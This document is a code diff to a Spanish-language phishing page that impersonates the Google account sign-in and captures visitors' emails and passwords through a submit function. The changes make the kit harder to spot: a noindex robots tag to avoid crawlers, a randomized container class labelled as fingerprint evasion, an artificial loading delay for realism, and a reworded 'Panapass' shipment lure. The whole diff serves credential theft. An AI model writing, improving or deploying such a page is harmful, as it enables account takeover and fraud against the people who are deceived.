@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Anti-crawler meta: Prevents indexing by search bots -->
+    <meta name="robots" content="noindex, nofollow">
     <title>Iniciar sesión - Cuentas de Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <style>
@@ -154,16 +156,21 @@
             font-size: 12px;
             margin-top: 8px;
         }
+        /* Randomized class for anti-fingerprinting */
+        .dynamic-container {
+            /* Random class added via JS */
+            box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container dynamic-container">
         <!-- Identifier Step -->
         <div id="identifier-step">
             <div class="header">
                 <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
                 <h1 class="title">Iniciar sesión</h1>
-                <p class="subtitle">Continuar a Panapass</p>
+                <p class="subtitle">Continuar con el envío de Panapass</p>
             </div>
             <form id="identifier-form">
                 <div class="form-group">
@@ -184,7 +191,7 @@
                 <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
                 <h1 class="title">Bienvenido</h1>
                 <p id="email-display" class="email-display"></p>
-                <p class="subtitle">Continuar a Panapass</p>
+                <p class="subtitle">Continuar con el envío de Panapass</p>
             </div>
             <form id="password-form">
                 <div class="form-group">
@@ -274,7 +281,7 @@
             .catch(err => console.log('Capture error: ' + err));
         }
 
-        // Handle identifier form submit: Validate email, capture, toggle to password step
+        // Handle identifier form submit: Validate email, capture, toggle to password step with delay
         document.getElementById('identifier-form').addEventListener('submit', function(e) {
             e.preventDefault();
             clearError();
@@ -287,12 +294,14 @@
                 showError('Ingresa una dirección de correo electrónico válida');
                 return;
             }
-            // Valid: toggle to password step
-            document.getElementById('email-display').textContent = enteredEmail;
-            document.getElementById('identifier-step').classList.add('hidden');
-            document.getElementById('password-step').classList.remove('hidden');
-            document.getElementById('password').focus();
-            resetTimeout();  // Reset timer on step change
+            // Valid: simulate loading delay, then toggle to password step
+            setTimeout(() => {
+                document.getElementById('email-display').textContent = enteredEmail;
+                document.getElementById('identifier-step').classList.add('hidden');
+                document.getElementById('password-step').classList.remove('hidden');
+                document.getElementById('password').focus();
+                resetTimeout();  // Reset timer on step change
+            }, 800);  // 0.8 second delay for realistic feel
         });
 
         // Handle password form submit: Submit with password
@@ -330,6 +339,12 @@
             const password = document.getElementById('password').value;
             submitData(password);
         });
+
+        // Randomized container class for fingerprint evasion
+        (function() {
+            var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
+            document.querySelector('.dynamic-container').classList.add(randomClass);
+        })();
     </script>
 </body>
 </html>
